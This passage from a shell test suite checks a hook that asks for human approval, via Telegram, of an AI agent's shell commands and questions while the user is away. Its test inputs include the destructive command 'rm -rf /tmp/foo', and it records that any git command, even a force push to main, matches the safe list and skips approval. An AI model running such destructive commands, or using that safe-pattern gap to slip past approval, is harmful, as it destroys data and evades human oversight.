    run_hook_with '{"tool_name": "Bash", "tool_input": {"command": ""}}' || rc=$?
    # Empty command won't match safe patterns but mock approves → exit 0
    assert_eq "0" "$rc"
    # Should have triggered approval flow for empty command
    assert_file_exists "$MOCK_AFD_LOG" "empty command should trigger approval (not in safe list)"
}
run_test "JSON parsing: empty command triggers approval" test_json_empty_command

test_json_missing_command_key() {
    setup_mock_home
    set_afk
    # Bash with no command key in tool_input
    local rc=0
    run_hook_with '{"tool_name": "Bash", "tool_input": {}}' || rc=$?
    # Should trigger approval flow (empty command not in safe list), mock approves
    assert_eq "0" "$rc"
}
run_test "JSON parsing: missing command key handled gracefully" test_json_missing_command_key

test_json_missing_description() {
    setup_mock_home
    set_afk
    # Bash command with no description
    local rc=0
    run_hook_with '{"tool_name": "Bash", "tool_input": {"command": "rm -rf /tmp/foo"}}' || rc=$?
    assert_eq "0" "$rc" "missing description should not break flow"
    assert_file_exists "$MOCK_AFD_LOG" "should still trigger approval"
}
run_test "JSON parsing: missing description handled gracefully" test_json_missing_description

test_json_malformed_input() {
    setup_mock_home
    set_afk
    # Completely malformed JSON
    local rc=0
    run_hook_with 'not json at all' || rc=$?
    # python3 JSON parse fails → tool_name is empty → not Bash → exit 0
    assert_eq "0" "$rc" "malformed JSON should not crash, treated as non-Bash"
}
run_test "JSON parsing: malformed JSON handled gracefully" test_json_malformed_input

# ── Edge cases ──────────────────────────────────────────────────────────────

test_git_is_safe_even_with_destructive_args() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "git push --force origin main")
    local rc=0
    run_hook_with "$json" || rc=$?
    # The safe pattern is "^git " — any git command passes
    assert_eq "0" "$rc" "git with destructive args still matches safe pattern"
    assert_file_not_exists "$MOCK_AFD_LOG" "should not trigger approval for git"
}
run_test "edge case: git push --force still allowed (safe pattern)" test_git_is_safe_even_with_destructive_args

test_env_var_prefixed_safe_command_not_matched() {
    # Commands like "VAR=x ls" would not match "^ls " pattern
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "FOO=bar ls /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    # "FOO=bar ls" starts with "FOO", not "ls" — not in safe list
    assert_file_exists "$MOCK_AFD_LOG" "env-prefixed command should not match safe pattern"
}
run_test "edge case: env var prefix prevents safe match" test_env_var_prefixed_safe_command_not_matched

# ── Stderr messages ─────────────────────────────────────────────────────────

test_stderr_afk_deactivation_message() {
    setup_mock_home
    set_afk
    set_user_active
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "AFK mode deactivated" "should report AFK deactivation on stderr"
}
run_test "stderr: AFK deactivation message" test_stderr_afk_deactivation_message

test_stderr_requesting_approval_message() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "requesting approval" "should report requesting approval on stderr"
}
run_test "stderr: requesting approval message" test_stderr_requesting_approval_message

test_stderr_waiting_message() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "Waiting for approval" "should report waiting on stderr"
}
run_test "stderr: waiting for approval message" test_stderr_waiting_message

test_stderr_notification_failure_message() {
    setup_mock_home
    set_afk
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "no valid output"
    exit 1
fi
EOF
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "Failed to send permission request" "should report notification failure"
}
run_test "stderr: notification failure message" test_stderr_notification_failure_message

# ── Multiple sequential safe commands (state isolation) ─────────────────────

test_multiple_safe_commands_no_approval() {
    setup_mock_home
    set_afk
    # Run multiple safe commands — none should trigger approval
    for cmd in "ls /tmp" "cat /etc/hostname" "git status" "echo hello" "date +%s"; do
        local json
        json=$(make_json "Bash" "$cmd")
        local rc=0
        run_hook_with "$json" || rc=$?
        assert_eq "0" "$rc" "safe command '$cmd' should exit 0"
    done
    assert_file_not_exists "$MOCK_AFD_LOG" "no afd calls for safe commands"
}
run_test "multiple safe commands: no approval triggered" test_multiple_safe_commands_no_approval

# ── AskUserQuestion AFK answering (CFG-323) ────────────────────────────────

test_ask_user_question_allowed_when_not_afk() {
    setup_mock_home
    local json
    json=$(make_json "AskUserQuestion" "" "")
    # Override: AskUserQuestion input has "question" not "command"
    json='{"tool_name":"AskUserQuestion","tool_input":{"question":"What branch?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "AskUserQuestion should be allowed when not AFK"
    assert_eq "" "$HOOK_STDOUT" "no stdout when not AFK"
}
run_test "AskUserQuestion: allowed when not AFK" test_ask_user_question_allowed_when_not_afk

test_ask_user_question_routed_to_telegram_when_afk() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    # Mock afd that logs calls and returns a fake notification ID
    cat > "$MOCK_AFD" << 'MOCK'
#!/usr/bin/env bash
echo "$@" >> "$HOME/.afd-calls.log"
if [[ "$1" == "notify" ]]; then
    echo "Notification sent #42"
elif [[ "$1" == "poll" ]]; then
    echo "What branch? Use main"
fi
MOCK
    chmod +x "$MOCK_AFD"
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"What branch should I deploy to?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "should allow with injected answer"
    # Verify the question was sent to Telegram
    assert_file_exists "$MOCK_HOME/.afd-calls.log"
    assert_file_contains "$MOCK_HOME/.afd-calls.log" "notify"
    assert_file_contains "$MOCK_HOME/.afd-calls.log" "What branch should I deploy to?"
    # Verify updatedInput is in stdout
    assert_contains "$HOOK_STDOUT" "updatedInput"
    assert_contains "$HOOK_STDOUT" "What branch? Use main"
}
run_test "AskUserQuestion: routed to Telegram when AFK" test_ask_user_question_routed_to_telegram_when_afk

test_ask_user_question_denied_on_timeout() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    cat > "$MOCK_AFD" << 'MOCK'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification sent #42"
elif [[ "$1" == "poll" ]]; then
    exit 1  # timeout
fi
MOCK
    chmod +x "$MOCK_AFD"
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"Continue?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should deny on poll timeout"
}
run_test "AskUserQuestion: denied on poll timeout" test_ask_user_question_denied_on_timeout

test_ask_user_question_denied_when_no_afd() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    rm -f "$MOCK_AFD"  # no afd CLI
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"Continue?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should deny when afd CLI missing"
}
run_test "AskUserQuestion: denied when afd CLI missing" test_ask_user_question_denied_when_no_afd

# ── Summary ─────────────────────────────────────────────────────────────────

suite_summary
